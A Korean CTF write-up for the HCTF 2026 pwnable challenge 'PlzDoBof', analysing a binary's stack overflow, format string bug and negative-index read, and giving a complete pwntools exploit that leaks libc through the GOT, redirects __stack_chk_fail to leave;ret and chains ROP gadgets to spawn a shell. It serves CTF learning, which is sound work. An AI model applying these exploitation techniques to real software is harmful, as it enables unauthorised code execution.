---
title: "[Writeup][HCTF 2026] PlzDoBof"
excerpt: "HCTF - PlzDoBof (pwnable)"

categories:
  - CS
tags:
  - [hctf, got overwrite, rop, canary, fsb]

permalink: /writeups/hctf-2026-plzdobof/

toc: true
toc_sticky: true

date: 2026-02-08
last_modified_at: 2026-02-08
---

`checksec`으로 바이너리에 적용된 보호기법을 관찰하면 다음과 같다.

<center>
      <img src="/assets/images/posts_img/writeups/hctf-2026-plzdobof/checksec.png" alt="checksec.png">
</center>

이로부터 다음과 같은 사실을 알 수 있다. 

* Partial RELRO가 적용되어 있기 때문에 GOT o.w가 가능하다.
* Canary가 있기 때문에, sbof를 통해 익스하려면 카나리 유출이 필요하다. 
* PIE가 걸려 있지 않아 바이너리에 있는 가젯이나 함수의 사용이 용이하다.

# 1. 취약점 분석

IDA로 바이너리를 살펴보면 다음과 같이 대놓고 sbof와 fsb를 준 것을 알 수 있다.

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
    char format[32]; // [rsp+10h] [rbp-230h] BYREF
    char s[520]; // [rsp+30h] [rbp-210h] BYREF
    ...
    puts("How was it? Thank you for using the system!");
    puts("Please, leave a review!");
    printf("Review: ");
    gets(s);
    printf("Name : ");
    gets(format);
    printf("Thank you for your review, ");
    printf(format);
    return 0;
}
```

더군다나 fsb를 위한 `format`이 `s`보다 위에 있기 때문에, fsb는 fsb대로 사용하면서 `s`를 통해 sbof가 가능하다. (만약 둘의 위치가 반대였다면 조금 골치아파질 것이다.)

바이너리를 조금 더 살펴보다 보면, 다음과 같이 `show_single_user()` 함수에서도 oob를 발견할 수 있다.

```c
unsigned __int64 show_single_user()
{
    int v1; // [rsp+Ch] [rbp-14h]
    char s[8]; // [rsp+10h] [rbp-10h] BYREF

    printf("Enter user index (0-29): ");
    fgets(s, 8, stdin);
    v1 = atoi(s);
    if ( v1 <= 29 )
    {
        if ( user_list[v1].name[0] ) 
            show_user(&user_list[v1]);
        else
            puts("User does not exist!");
    }
    else
    {
        puts("Don't Do OOB!");
    }
}
```

다음과 같이 인덱스로 쓰이는 `v1`의 상한만 검사하는데, `v1`은 `int`형이라 음의 값을 가질 수 있다. 그러나 음의 값에 대한 검증이 누락됐기 때문에
전역 배열인 `user_list` 뒤쪽의 값에 대해 `user_list[v1].name[0]`이 0만 아니라면 주변 값들을 읽어낼 수 있다. 따라서 `user_list` 뒤쪽으로 무슨 값이 있는지
동적 분석을 통해 알아내야 한다.

GDB를 사용해 `user_list` 뒤쪽의 값을 살펴보면 다음과 같다.

<center>
      <img src="/assets/images/posts_img/writeups/hctf-2026-plzdobof/before_userlist.png" alt="before_userlist.png">
</center>

놀랍게도 got영역이다! 이를 잘 사용하면 libc leak을 굉장히 쉽게 할 수 있다.

# 2. 익스플로잇

## 2-1. libc leak

위에서 말한 방법을 사용하면 굉장히 쉽게 libc leak이 가능하다. 난 `-3`일 때 나오는 `fgets()`의 got을 사용했다.

```python
def show_user(idx):
    p.sendlineafter(b"> ", b'2')
    p.sendlineafter(b": ", str(idx).encode())

    p.recvuntil(b"Name: ")
    try:
        name = p.recvline().strip().decode()
    except:
        name = None

    p.recvuntil(b"Age: ")
    try:
        age = p.recvline().strip().decode()
    except:
        age = None

    p.recvuntil(b"Introduction: ")
    try:
        introduction = p.recvline().strip().decode()
    except:
        introduction = None

    print(name, age, introduction)
    
    return name, age, introduction

_, fgets_got, _ = show_user(-3)
fgets_got = int(fgets_got)
libc.address = fgets_got - 0x7f380
```

이제 libc의 가젯들도 사용할 수 있게 되었다.

## 2-2. rop (w/ canary bypass)

이제 rop를 통해 쉘을 열어야 하는데, 문제는 fsb가 한 번만 가능하고 sbof와 fsb가 붙어있다는 것이다. 따라서 fsb로 카나리를 유출한 후
sbof로 rop chain을 만드는 것은 불가능하고, 다른 방법을 생각해야 한다.

이를 우회하기 위해 첫 번째로 생각한 방법이 원본 카나리값 자체를 바꿔버리는 것이다. (최근에 카나리 관련 프로젝트를 했는데, 이게 카나리 값 자체를 변조하는거랑
관련이 있어서 이 생각이 가장 먼저 났던 것 같다.) 실제로 libc base와 TLS까지의 오프셋은 항상 일정하기 때문에, libc base만 안다면 TLS의 주소를 알 수 있고,
다음과 같이 카나리 값 자체를 변경해버릴 수 있다.

```python
payload = fmtstr_payload(8,{libc.address + [canary_offset]: 0xdeadbeefcafebabe})

ropchain = b"A" * 0x210
ropchain += p64(0xdeadbeefcafebabe)  # canary
...

p.sendlineafter(b"> ", b'5')
p.sendlineafter(b": ", ropchain)
p.sendlineafter(b": ", payload)
```

그러나 fsb에서 원하는 주소에 값이 쓰이는 건 `printf()` 함수가 리턴되기 전에 완료되기 때문에, 이렇게 하면 `printf()`가 리턴하며 하는 카나리 검사에서
터져버리게 된다. 여기서 고민하다가, got에서 다음과 같은 함수를 봤다.

<center>
      <img src="/assets/images/posts_img/writeups/hctf-2026-plzdobof/stack_chk_fail_got.png" alt="stack_chk_fail_got.png">
</center>

생각해 보면 `__stack_chk_fail()`도 경국 libc에 존재하는 함수이고, 따라서 got가 존재할 수밖에 없다. 그렇다면 `__stack_chk_fail()`의 got를 
`leave; ret`으로 덮는다면, 프로그램이 종료되지 않고 계속 실행되게 할 수 있다.[^1] 어차피 바이너리에 PIE가 적용되어 있지 않기 때문에, `main()`의 
`leave; ret`을 그대로 사용해줬다.

```py
payload = fmtstr_payload(8,{e.got["__stack_chk_fail"]: 0x401A03})

ropchain = b"A" * 0x210
ropchain += p64(0xdeadbeefcafebabe)  # 이제 아무런 값이나 상관없다!
ropchain += p64(pop_rdi_ret)
ropchain += p64(binsh)
ropchain += p64(0x0000000000029139 + libc.address)  # ret
ropchain += p64(libc.symbols["system"])
ropchain += p64(libc.symbols["system"])
ropchain += p64(libc.symbols["system"])
ropchain += p64(libc.symbols["system"])
ropchain += p64(libc.symbols["system"])
ropchain += p64(libc.symbols["system"])
ropchain += p64(libc.symbols["system"])

p.sendlineafter(b"> ", b'5')
p.sendlineafter(b": ", ropchain)
p.sendlineafter(b": ", payload)
p.interactive()
```

전체 익스플로잇 코드는 다음과 같다.

<details>
<summary>펼치기/접기</summary>
{% highlight python %}
from pwn import *

# context.log_level = "debug"
# context.bits = 64
context.arch = "amd64"
# context.binary = "./chal"
context.terminal=['tmux', 'splitw', '-h']

e = ELF("./chal")
p = e.process()
# p = remote("** REDICATED **", 33333)
libc = ELF("./libc.so.6")

def show_user(idx):
p.sendlineafter(b"> ", b'2')
p.sendlineafter(b": ", str(idx).encode())

    p.recvuntil(b"Name: ")
    try:
        name = p.recvline().strip().decode()
    except:
        name = None

    p.recvuntil(b"Age: ")
    try:
        age = p.recvline().strip().decode()
    except:
        age = None

    p.recvuntil(b"Introduction: ")
    try:
        introduction = p.recvline().strip().decode()
    except:
        introduction = None

    print(name, age, introduction)

    return name, age, introduction

_, fgets_got, _ = show_user(-3)
fgets_got = int(fgets_got)
libc.address = fgets_got - 0x7f380
canary_addr = libc.address - 0x2898

info(f"printf_got: {hex(fgets_got)}")
info(f"libc base: {hex(libc.address)}")
info(f"canary at: {hex(canary_addr)}")

binsh = libc.address + 0x1d8678
pop_rdi_ret = libc.address + 0x000000000002a3e5

payload = fmtstr_payload(8,{e.got["__stack_chk_fail"]: 0x401A03})

ropchain = b"A" * 0x210
ropchain += p64(0xdeadbeefcafebabe)
ropchain += p64(pop_rdi_ret)
ropchain += p64(binsh)
ropchain += p64(0x0000000000029139 + libc.address)
ropchain += p64(libc.symbols["system"])
ropchain += p64(libc.symbols["system"])
ropchain += p64(libc.symbols["system"])
ropchain += p64(libc.symbols["system"])
ropchain += p64(libc.symbols["system"])
ropchain += p64(libc.symbols["system"])
ropchain += p64(libc.symbols["system"])

p.sendlineafter(b"> ", b'5')
p.sendlineafter(b": ", ropchain)
# gdb.attach(p)
p.sendlineafter(b": ", payload)

p.interactive()
{% endhighlight %}
</details>

실행하면 쉘을 얻을 수 있다.

<center>
      <img src="/assets/images/posts_img/writeups/hctf-2026-plzdobof/flag.png" alt="flag.png">
</center>

[^1]: 물론 `call` 인스트럭션의 영향으로 retaddr이 stack에 push되긴 하지만, stack frame 형성 전에 `leave; ret`가 호출되므로 아무 상관 없다. `leave`가 `mov rsp, rbp; pop rbp`라는 점을 기억하자.